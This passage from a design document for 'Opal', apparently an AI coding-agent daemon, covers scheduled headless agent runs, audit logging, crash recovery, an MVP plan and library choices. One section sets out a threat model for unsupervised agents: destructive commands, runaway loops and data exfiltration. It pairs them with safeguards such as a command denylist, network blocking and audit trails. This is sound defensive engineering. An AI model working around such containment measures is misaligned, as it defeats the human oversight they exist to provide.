```

**Audit trail**: Every headless agent execution is logged to `~/.opal/scheduler/audit.jsonl`:

```json
{
  "task_id": "ci-check",
  "started_at": "2026-02-19T04:30:00Z",
  "duration_ms": 45000,
  "tool_calls": [
    {"tool": "shell", "args": {"command": "mix test"}, "result_preview": "12 tests, 0 failures"},
    {"tool": "schedule", "args": {"action": "unregister", "task_id": "ci-check"}}
  ],
  "tokens_used": 8200,
  "outcome": "self_cancelled"
}
```

Viewable via `opal audit` or `opal audit --task ci-check`.

### Threat Summary and Defense Matrix

```mermaid
graph LR
    subgraph "Threats"
        T1["💥 Destructive<br/>commands"]
        T2["🔄 Infinite<br/>loops"]
        T3["📤 Data<br/>exfiltration"]
    end

    subgraph "Defenses"
        D1["No shell by default"]
        D2["Command denylist"]
        D3["Token + time + call limits"]
        D4["Loop detection"]
        D5["Network blocked"]
        D6["Path blocking"]
        D7["Env sanitization"]
        D8["Audit trail"]
    end

    T1 --> D1
    T1 --> D2
    T1 --> D3
    T2 --> D3
    T2 --> D4
    T3 --> D5
    T3 --> D6
    T3 --> D7
    T1 --> D8
    T2 --> D8
    T3 --> D8
```



### Design Principle: Fail Closed

Every security boundary fails closed. If the guard can't determine whether a command is safe, it blocks it. If token counting is uncertain, use the higher estimate. If a timer message arrives for an unknown task, ignore it. The user sees a clear message explaining what was blocked and why, so they can adjust the task definition or run it interactively instead.

**The fundamental contract**: Headless scheduled agents are **observers that report**. They look at your code, run your tests, check your CI, and tell you what they found. They don't change things. If you want an agent to make changes, sit in front of the terminal and supervise it. This isn't a limitation — it's the correct trust boundary for unsupervised AI execution.

---

## 9. Fault Tolerance & Recovery

### Session Recovery After Daemon Crash

Session data survives crashes because DETS files persist on disk. The agent's existing `maybe_recover_session` loads messages and starts in `:idle`. In-flight tool calls are **not replayed** — tool execution isn't idempotent (shell commands, file writes), so replay would be dangerous.

On daemon restart, `SessionManager` scans `~/.opal/sessions/*.dets` and knows which sessions can be resumed. Sessions are loaded **lazily** — only when a client reconnects to a specific session. No eager resume of 100 sessions at startup.

### DETS Corruption Handling

DETS is fragile under crashes. Defensive pattern:

```elixir
def safe_open(session_id, path) do
  case :dets.open_file(dets_name(session_id), file: to_charlist(path)) do
    {:ok, ref} -> {:ok, ref}
    {:error, {:not_a_dets_file, _}} ->
      File.rename!(path, path <> ".corrupt.#{System.os_time(:second)}")
      {:error, :corrupted}
  end
end
```

**Future improvement**: Replace DETS with atomic-rename persistence (`term_to_binary` → write `.tmp` → `File.rename!`). Atomic rename is crash-safe on all target filesystems.

### Graceful Shutdown

```mermaid
flowchart TD
    Stop["daemon/shutdown RPC"] --> Close["Close listener socket<br/>(stop accepting connections)"]
    Close --> Drain["Send :drain to each<br/>active agent"]

    Drain --> Idle{":idle"}
    Drain --> Run{":running /<br/>:streaming"}
    Drain --> Tools{":executing_tools"}

    Idle --> Save["Save & stop<br/>immediately"]
    Run --> Finish["Finish current turn<br/>→ save & stop"]
    Tools --> Wait["Wait for in-flight tools<br/>→ save & stop"]

    Save --> Check{"All agents<br/>drained?"}
    Finish --> Check
    Wait --> Check

    Check -->|Yes| Exit["Clean exit ✅"]
    Check -->|No, 30s timeout| Kill["Force-kill remaining<br/>sessions → exit"]
```



### Health Monitoring

`SessionManager` periodic sweep (every 60s):

1. **Stuck agents**: `Process.info(pid, :message_queue_len) > 100` → log warning, kill after 3 consecutive checks
2. **Memory pressure**: `:erlang.memory(:total) > threshold` → force-hibernate idle sessions, then terminate oldest idle
3. **Zombie sessions**: Sessions in `DynamicSupervisor.which_children` not tracked by `SessionManager` → terminate

---

## 10. MVP Implementation Plan

### Guiding Principles

1. **Every phase is backward-compatible** — standalone stdio mode always works
2. **Daemon mode is additive** — new modules, minimal modifications to existing code
3. **Ship incrementally** — each phase is independently useful and testable

### Phase 1: Transport Abstraction (Foundation)

Extract `RPC.Server` into composable modules. **Zero behavior change** — pure refactor.

| File | Action | Description |
|------|--------|-------------|
| `lib/opal/transport/transport.ex` | Create | Behaviour: `send_message/2`, `close/1`, `connection_info/1` |
| `lib/opal/rpc/handler.ex` | Create | Extract all `dispatch/2` clauses from `RPC.Server`. Pure dispatch logic. |
| `lib/opal/rpc/connection.ex` | Create | Extract subscription tracking, pending requests, event forwarding. |
| `lib/opal/transport/stdio.ex` | Create | Extract stdin/stdout I/O from `RPC.Server`. |
| `lib/opal/rpc/server.ex` | Modify | Thin shim delegating to `Transport.Stdio` + `RPC.Connection`. |
| `lib/opal/application.ex` | Modify | Replace `RPC.Server` child with `Transport.Stdio` when `:start_rpc`. |

**~400 lines of code. All existing tests pass unchanged.**

### Phase 2: Session Manager

| File | Action | Description |
|------|--------|-------------|
| `lib/opal/session/manager.ex` | Create | DETS-backed session registry, bind/unbind/list/connection_for. |
| `lib/opal.ex` | Modify | `start_session/1` optionally calls `SessionManager.bind/2`. |
| `lib/opal/rpc/handler.ex` | Modify | `session/start` calls `SessionManager.bind/2`. Add `session/list_active`. |
| `lib/opal/tool/ask_user.ex` | Modify | Route `request_client` through `RPC.Connection` with session-aware lookup. |

**~250 lines of code.**

### Phase 3: Socket Transport (Daemon Connectivity)

| File | Action | Description |
|------|--------|-------------|
| `lib/opal/transport/acceptor.ex` | Create | Unix domain socket / TCP listener. Accept loop, spawn connections. |
| `lib/opal/transport/socket.ex` | Create | Per-connection GenServer wrapping `:gen_tcp`. |
| `lib/opal/config.ex` | Modify | Add `daemon` field with `socket_path`, `pid_file` subfields. |

**~300 lines of code.**

### Phase 4: Daemon Lifecycle

| File | Action | Description |
|------|--------|-------------|
| `lib/opal/daemon/daemon.ex` | Create | PID file, status API, stale-daemon detection, graceful shutdown. |
| `lib/opal/application.ex` | Modify | Conditional child list: `:standalone` vs `:daemon` mode. |
| `lib/opal/rpc/handler.ex` | Modify | Add `daemon/status`, `daemon/shutdown` dispatch clauses. |
| `lib/opal/agent/agent.ex` | Modify | Add hibernate-on-idle (~5 lines). |

**~200 lines of code.**

### Phase 5: Schedule Tool + Scheduler

| File | Action | Description |
|------|--------|-------------|
| `lib/opal/scheduler/task.ex` | Create | Minimal task struct (id, prompt, schedule, cancel_when, working_dir). |
| `lib/opal/scheduler/scheduler.ex` | Create | Lightweight GenServer: register/unregister/fire. DETS-persisted. `Process.send_after` timers. |
| `lib/opal/tool/schedule.ex` | Create | `Opal.Tool.Schedule` — agent-facing tool for register/unregister/list. |
| `lib/opal/rpc/handler.ex` | Modify | Add `scheduler/list` RPC for CLI introspection. |

**~300 lines of code. The scheduler is a tool, not a framework.**

### Phase 6: CLI Integration (TypeScript)

| File | Action | Description |
|------|--------|-------------|
| `cli/src/sdk/daemon-client.ts` | Create | Discover daemon, connect via socket, auth handshake. |
| `cli/src/sdk/client.ts` | Modify | Auto-spawn daemon on first use, fall back to standalone. Lock-based dedup. |
| `cli/src/bin.ts` | Modify | Add `daemon stop/status` subcommands (no `start` — it's automatic). |
| `cli/src/sdk/protocol.ts` | Regenerate | New daemon/scheduler method types (via codegen). |

### Summary


| Phase | New Files | Modified | Lines (est.) | Dependency |
|-------|-----------|----------|-------------|------------|
| 1. Transport | 4 | 2 | ~400 | None |
| 2. Session Manager | 1 | 3 | ~250 | Phase 1 |
| 3. Socket Transport | 2 | 1 | ~300 | Phase 1 |
| 4. Daemon Lifecycle | 1 | 3 | ~200 | Phases 2, 3 |
| 5. Schedule Tool | 3 | 1 | ~300 | Phase 4 |
| 6. CLI Integration | 1 | 3 | ~300 | Phase 4 |
| **Total** | **12** | **~10** | **~1750** | |

**The entire daemon layer is additive — it wraps the existing architecture rather than modifying it.** No changes to Agent, Session DETS, Tool implementations, Provider, MCP, or Events. This is the strongest validation of the current OTP design.

---

## 11. Future Work

### Deferred to Post-MVP

| Feature | Why Defer |
|---------|-----------|
| **Cron syntax scheduling** | Interval + one-shot covers MVP. Cron expressions add parser complexity. |
| **Session sharing (`--attach`)** | Requires multi-client event routing complexity |
| **Desktop notifications** | Platform-specific, not core to agent UX |
| **Agent-to-agent messaging** | Sub-agents already work for delegation |
| **Scheduled task approval queue** | Hard limits + read-only default is sufficient guard |
| **Per-task token budgets** | Useful but not critical with sane defaults |
| **Web UI for sessions** | Entirely separate project |
| **CubDB/SQLite for sessions** | DETS with atomic-rename fallback is sufficient |
| **Write-ahead log (WAL)** | Adds complexity; current auto-save covers most cases |
| **Windows Service (erlsrv)** | Detached process works for MVP |
| **HTTP health endpoint** | RPC health method is sufficient |

### Long-Term Vision

- **Distributed Opal**: Multiple daemon nodes sharing work via Erlang distribution (true multi-machine agent coordination)
- **Plugin system**: Third-party scheduler task types (beyond prompts)
- **Web dashboard**: Browser-based session viewer connecting via WebSocket
- **Team mode**: Shared daemon instance with role-based access control

---

## Appendix: Library Recommendations

| Need | Recommendation | Rationale |
|------|---------------|-----------|
| Job scheduling | `Process.send_after` + custom GenServer | No Oban (requires Postgres), no Quantum (overkill). Native OTP timers. |
| HTTP server (future) | Bandit | Pure Elixir, Plug-native, Phoenix 1.8+ default. Add only when needed (web UI, health endpoint). |
| PubSub | Keep `Registry` | Phoenix.PubSub only adds value for multi-node. Registry is zero-dep, lifecycle-aware, faster for local. |
| Config storage | `:persistent_term` (future) | `Application.get_env` is fine now. Add `:persistent_term` when profiling shows hot config reads. |
| Session persistence | DETS → atomic-rename → CubDB (evolution) | Start with DETS (works today), improve crash safety with atomic rename, consider CubDB if scale demands. |
| Telemetry | `telemetry` + `telemetry_metrics` | Standard BEAM instrumentation. Already a transitive dep via Req. |
